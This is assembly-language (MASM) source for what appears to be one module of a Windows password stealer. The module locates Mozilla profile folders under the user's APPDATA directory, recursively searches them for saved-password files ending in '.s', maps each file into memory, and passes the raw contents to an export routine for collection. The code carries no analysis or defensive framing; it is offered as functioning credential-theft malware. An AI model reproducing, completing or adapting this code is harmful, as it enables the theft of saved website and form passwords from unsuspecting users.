; Mozilla form & site passwords
; Tested on Mozilla 1.7.2

.data
	@AllocStr	<szMozillaSearch>,	<"\*.*">
	@AllocStr	<szMozillaProfile>,	<"\Mozilla\Profiles">
	@AllocMem	<lpMozillaPath>, 	<MAX_PATH+1>

.code

GetMozillaProfiles proc uses edi
	LOCAL   FindFileData: WIN32_FIND_DATA
	LOCAL   hFind: DWORD
	LOCAL	hMap: MappedFile
	
	invoke	lstrlen, offset lpMozillaPath
	lea	edi, [eax+offset lpMozillaPath+1]        
        invoke	lstrcat, offset lpMozillaPath, offset szMozillaSearch
        	
	invoke  FindFirstFile, offset lpMozillaPath, addr FindFileData
	mov     hFind, eax
	inc     eax
	jz      @ret	
        
@find_loop:                
        cmp	FindFileData.cFileName[0], '.'
        jz	@level_up_skip
        
        invoke	lstrcpy, edi, addr FindFileData.cFileName
        invoke	lstrlen, offset lpMozillaPath
        .IF	eax > 2
		cmp	word ptr[offset lpMozillaPath+eax-2], 's.'
		.IF	ZERO?
			invoke	MapFile, offset lpMozillaPath, addr hMap 
			.IF	eax
				invoke	ExportData, TYPE_MOZILLA_DAT, 0, hMap.lpMem, hMap.dwFileSize
			.ENDIF
			invoke	UnmapFile, addr hMap
		.ENDIF
        .ENDIF
        invoke	GetMozillaProfiles
        
@level_up_skip:
	invoke  FindNextFile, hFind, addr FindFileData
	test    eax, eax
	jnz	@find_loop

	invoke  FindClose, hFind

@ret:
	ret
GetMozillaProfiles endp

GetMozillaPass proc
	; Write header
	invoke	ExportModule, MODULE_MOZILLA
	
	.IF	dwSHGetFolderPath
		push	offset lpMozillaPath 
		push	0
		push	NULL
		push	CSIDL_APPDATA
		push	NULL
		call	dwSHGetFolderPath
		.IF	eax == S_OK
			invoke	lstrcat, offset lpMozillaPath, offset szMozillaProfile
			invoke	GetMozillaProfiles
		.ENDIF
	.ENDIF	
	ret
GetMozillaPass endp
